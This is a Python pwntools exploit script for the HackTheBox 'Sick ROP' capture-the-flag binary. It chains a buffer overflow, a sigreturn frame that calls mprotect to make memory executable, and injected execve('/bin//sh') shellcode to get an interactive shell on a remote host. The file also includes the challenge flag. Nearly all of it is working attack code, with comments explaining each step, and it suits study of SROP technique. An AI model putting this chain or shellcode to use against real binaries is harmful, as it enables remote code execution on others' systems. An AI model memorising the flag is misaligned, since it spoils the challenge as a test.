# credit: https://corruptedprotocol.medium.com/sickrop-hackthebox-introduction-to-sigreturn-oriented-programming-srop-8b27727cd441
# Helped with using vuln() pointer instead of function. 
# Helped with placing "C" padding on 2nd payload instead of 1st.

from pwn import *
context.clear(arch='amd64')
context.terminal = ['tmux','splitw' ,'-h']

# HTB{why_st0p_wh3n_y0u_cAn_s1GRoP!?}

#p = process("./sick_rop")
#p = gdb.debug("./sick_rop", "break vuln")
p = remote("206.189.125.216", 31912)

# 23 bytes
shellcode = (b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05")

# Find a function pointer's memory address by searching function's memory address as a value
# within another memory address.
# gef➤  grep 0x40102e <- vuln()
# [+] Searching '\x2e\x10\x40' in memory
# [+] In '/home/fresh/CTF/htb/sick_ROP/sick_rop'(0x401000-0x402000), permission=r-x
#   0x4010d8 - 0x4010e4  →   "\x2e\x10\x40[...]" 
vuln_pointer = 0x4010d8
syscall = 0x401014
vuln  = p64(0x40102e)
rwx = 0x400000

# https://docs.pwntools.com/en/stable/rop/srop.html
# mprotect(writable, 0x4000, 7)
frame = SigreturnFrame(kernel="amd64")
frame.rax = 10
frame.rdi = rwx
frame.rsi = 0x4000
frame.rdx = 7
frame.rsp = vuln_pointer  # Notes below for vuln_pointer instead of vuln() address.
frame.rip = syscall

# Why not vuln function but a pointer to vuln?
# Stack frames changed. Calling the vuln function directly will not get us to that function

# 1. Padding
# 2. ret2vuln() to adjust RAX to 0xf with 2nd payload
# 3. 'syscall; ret' gadget to use sigreturn()
# 4. bytes(frame) sets up the stack after sigreturn() is called and 
#    return to vuln() for 3rd run for final payload(3).
payload1 = b"A"*40 + vuln + p64(syscall) + bytes(frame)

p.sendline(payload1)
p.recv()

# @ 2nd run of vuln()
# Control number in RAX. 15(0xf) = sigreturn()
payload2 = b"C"*15
p.send(payload2)
p.recv()

# Shellcode + Padding + ret2shellcodea
# No leak/maths necessary, padding lands on same memory address.
payload3 = shellcode + b"\x90"*17 + p64(0x4010b8)

p.send(payload3)
p.recv()
p.interactive()
